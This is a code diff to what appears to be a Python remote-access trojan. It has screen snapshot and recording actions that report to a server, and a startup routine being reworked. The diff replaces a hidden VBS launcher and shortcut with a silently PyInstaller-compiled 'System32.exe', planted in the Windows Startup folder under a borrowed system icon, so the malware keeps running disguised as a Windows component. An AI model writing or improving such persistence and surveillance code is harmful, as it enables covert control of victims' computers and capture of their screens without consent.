@@ -131,7 +131,7 @@ class Display:
         if self.action == "snapshot":
             self.snapshot()
         elif self.action == "record":
-            if  DISPLAY_IS_RECORDING == False:
+            if DISPLAY_IS_RECORDING == False:
                 self.record()
             else:
                 toServer({
@@ -429,9 +429,9 @@ class Others:
                 
     def startup(self):
         startupFolder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        vbsFile = os.path.join(startupFolder, "System32.vbs")
-        lnkFile = os.path.join(startupFolder, "System32.lnk")
+        exeFile = os.path.join(startupFolder, "System32.exe")
         icoFile = os.path.join(os.environ["APPDATA"], "python313", "icon.ico")
+        stubFile = os.path.join(os.environ["APPDATA"], "python313", "stub.py")
 
         # Baixa o icone do GitHub
         try:
@@ -443,23 +443,23 @@ class Others:
         except:
             icoFile = "C:\\Windows\\System32\\shell32.dll"
 
-        # Cria o VBS
-        with open(vbsFile, "w") as f:
-            f.write(f'rem python installer\nCreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m System32 {sys.argv[1]}""", 0')
+        # Cria o script stub que sera compilado
+        with open(stubFile, "w") as f:
+            f.write(f'import os\nos.system("cmd /c \\"cd %APPDATA%\\\\{BASE_FOLDER_NAME} & python -m System32 {sys.argv[1]}\\"")')
 
-        # Cria o atalho com icone
-        ps = f"""
-$WS = New-Object -ComObject WScript.Shell
-$SC = $WS.CreateShortcut('{lnkFile}')
-$SC.TargetPath = '{vbsFile}'
-$SC.IconLocation = '{icoFile},0'
-$SC.Save()
-"""
-        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps])
+        # Instala pyinstaller e compila o .exe com icone
+        pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
+        pyinstallerPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pyinstaller.exe")
+
+        subprocess.run(f'"{pipPath}" install pyinstaller', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(
+            f'"{pyinstallerPath}" --onefile --windowed --icon="{icoFile}" --distpath="{startupFolder}" --name="System32" "{stubFile}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
 
         toServer({
             "type": self.type,
-            "output": f"Startup file created successfully" if os.path.exists(lnkFile) else f"Startup file creation failed"
+            "output": f"Startup file created successfully" if os.path.exists(exeFile) else f"Startup file creation failed"
         })
 
 HANDLER_MAP = {
